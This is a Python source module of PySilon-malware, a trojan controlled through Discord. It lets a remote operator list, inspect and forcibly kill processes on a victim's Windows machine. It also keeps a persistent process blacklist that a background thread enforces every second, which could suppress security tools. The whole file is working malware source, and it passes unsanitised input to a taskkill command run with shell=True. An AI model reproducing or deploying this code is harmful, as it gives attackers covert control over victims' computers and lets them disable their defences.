from psutil import process_iter, Process
from resources.misc import *
from win32process import GetWindowThreadProcessId
from win32gui import GetForegroundWindow
# end of imports
# on reaction add
elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
    #.log Reaction is "confirm killing a process" 
    await reaction.message.delete()
    #.log Removed the message 
    try:
        #.log Trying to parse the process name 
        process_name = process_to_kill[0]
        if process_name[-1] == ']':
            process_name = process_name[::-1]
            for i in range(len(process_name)):
                if process_name[i] == '[':
                    process_name = process_name[i+4:]
                    break
            process_name = process_name[::-1]
        #.log Process name parsed successfully 
    except Exception as e:
        #.log Error occurred while trying to parse the process name 
        embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await reaction.message.channel.send(embed=embed)
        #.log Sent message about the error with more details 
        await reaction_msg.add_reaction('🔴')
    try:
        #.log Trying to kill processes 
        killed_processes = []
        for proc in process_iter():
            if proc.name() == process_name:
                proc.kill()
                #.log Killed a process 
                killed_processes.append(proc.name())
        processes_killed = ''
        for i in killed_processes:
            processes_killed = processes_killed + '\n• ' + str(i)
        embed = discord.Embed(title="🟢 Success",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await reaction.message.channel.send(embed=embed)
        #.log Sent message about killed processes 
        await reaction_msg.add_reaction('🔴')
    except Exception as e:
        #.log Error occurred while trying to kill processes 
        embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await reaction.message.channel.send(embed=embed)
        #.log Sent message about the error with more details 
        await reaction_msg.add_reaction('🔴')
elif str(reaction) == '🔴' and reaction.message.content[-25:] == '.kill <process-number>```':
    #.log Reaction is "cancel process killing" 
    for i in processes_messages:
        try: await i.delete()
        except: pass
    #.log Removed messages containing list of running processes 
    processes_messages = []
# on message
elif message.content[:5] == '.show':
    #.log Message is "show" 
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.show':
        #.log Author issued empty ".show" 
        embed = discord.Embed(title="📛 Error",description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message with usage of ".show" 
    else:
        if message.content[6:] == 'processes':
            #.log Author requested to list running processes 
            processes, processes_list = [], []
            for proc in process_iter():
                processes.append(proc.name())
            #.log Obtained information about running processes 
            processes.sort(key=str.lower)
            #.log Sorted the processes list 
            how_many, temp = 1, processes[0]; processes.pop(0)
            for i in processes:
                if temp == i: how_many += 1
                else:
                    if how_many == 1: processes_list.append('``' + temp + '``')
                    else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
                    temp = i
            #.log Formatted processes names to show how many duplicates are there 
            total_processes = len(processes)
            #.log Calculated amount of running processes 
            processes = ''
            reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
            #.log Sent header message of processes list 
            processes_messages.append(reaction_msg)
            for proc in range(1, len(processes_list)):
                if len(processes) < 1800:
                    processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                    #.log List of running processes is below 1800 characters. PySilon won\'t divide it 
                else:
                    #.log List of running processes is above 1800 characters. PySilon will divide it into smaller pieces 
                    processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                    reaction_msg = await message.channel.send(processes)
                    #.log Sent a piece of processes list 
                    processes_messages.append(reaction_msg)
                    processes = ''
            reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
            #.log Sent footer message of processes list 
            processes_messages.append(reaction_msg)
            await reaction_msg.add_reaction('🔴')
elif message.content == '.foreground':
    #.log Message is "get foreground window process name" 
    await message.delete()
    #.log Removed the message 
    foreground_process = active_window_process_name()
    if foreground_process == None:
        #.log Failed to get foreground window process name 
        embed = discord.Embed(title="📛 Error",description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message about failure 
    else:
        #.log Successfully obtained foreground window process name 
        embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message with the process name 
elif message.content[:10] == '.blacklist':
    await message.delete()
    if message.content.strip() == '.blacklist':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
            disabled_processes_list = disabled_processes.readlines()
        for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
        if message.content[11:] not in disabled_processes_list:
            disabled_processes_list.append(message.content[11:])
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                disabled_processes.write('\n'.join(disabled_processes_list))
            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been added to process blacklist```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        else:
            embed = discord.Embed(title="📛 Error",description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
elif message.content[:10] == '.whitelist':
    await message.delete()
    if message.content.strip() == '.whitelist':
        embed = discord.Embed(title="📛 Error",description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
            disabled_processes_list = disabled_processes.readlines()
        for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
        if message.content[11:] in disabled_processes_list:
            disabled_processes_list.pop(disabled_processes_list.index(message.content[11:]))
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                disabled_processes.write('\n'.join(disabled_processes_list))
            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been removed from process blacklist```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        else:
            embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
elif message.content[:5] == '.kill':
    #.log Message is "kill a process" 
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.kill':
        #.log Author issued empty ".kill" 
        embed = discord.Embed(title="📛 Error",description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message with usage of ".kill" 
    elif check_int(message.content[6:]):
        #.log Argument is integer 
        if len(processes_list) > 10:
            #.log Process list is generated 
            #.log Checking if there is a process with provided process ID 
            if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
                #.log Found a process with provided process ID 
                reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                #.log Sent message with confirmation of killing a process 
                process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
                await reaction_msg.add_reaction('💀')
                #.log Reacted with "kill" 
                await reaction_msg.add_reaction('🔴')
                #.log Reacted with "cancel" 
            else:
                #.log Couldn\'t find any process with provided process ID 
                embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                #.log Sent message about wrong process ID 
        else:
            #.log Processes list is not generated 
            embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            #.log Sent message about missing process list 
    elif message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
        #.log Process list is not generated, but valid process name is provided 
        stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()} /t', capture_output=True, shell=True).stdout).strip()
        #.log Tried to kill provided process 
        await asyncio.sleep(0.5)
        if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
            #.log Process is not running anymore 
            embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            #.log Sent message about successfull kill 
        else:
            #.log Process is still running 
            embed = discord.Embed(title="📛 Error",description=f'```Tried to kill {message.content[6:]} but it\'s still running...```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            #.log Sent message about unsuccessfull kill 
    else:
        #.log Processes list is not generated 
        embed = discord.Embed(title="📛 Error",description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        #.log Sent message about missing process list 
# anywhere
def check_int(to_check):
    try:
        asd = int(to_check) + 1
        return True
    except: return False
def active_window_process_name():
    try:
        pid = GetWindowThreadProcessId(GetForegroundWindow())
        return(Process(pid[-1]).name())
    except:
        return None
def process_blacklister():
    global embeds_to_send
    while True:
        if os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
            with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                process_blacklist = disabled_processes.readlines()
            for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
            for process in process_blacklist:
                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {process} /t', capture_output=True, shell=True).stdout).strip()
                    #.log Tried to kill provided process
                    time.sleep(1)
                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                        #.log Process is not running anymore 
                        embed = discord.Embed(title="🟢 Success", description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
                        #.log Sent message about successful kill
                    else:
                        #.log Process is still running 
                        embed = discord.Embed(title="📛 Error",description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        embeds_to_send.append([channel_ids['main'], embed])
                        #.log Sent message about unsuccessfull kill 
        time.sleep(1)
# !process_blacklister
threading.Thread(target=process_blacklister).start()
